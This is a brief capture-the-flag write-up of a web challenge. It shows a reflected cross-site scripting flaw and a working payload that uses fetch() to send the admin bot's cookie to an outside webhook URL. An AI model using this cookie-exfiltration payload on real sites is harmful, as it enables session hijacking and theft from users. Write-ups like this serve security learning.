Challenge

The admin bot visits any URL you give it. Find a way to steal the flag.

Category: Web
Points: 150
Solves: 42

Solution

The input parameter was reflected directly into the page without sanitization:

https://challenge.example.com/?name=<script>alert(1)</script>

We crafted a payload to exfiltrate the admin’s cookie:

<script>
  fetch("https://webhook.site/our-id?c=" + document.cookie);
</script>

The admin bot visited our URL and the flag was delivered to our webhook.
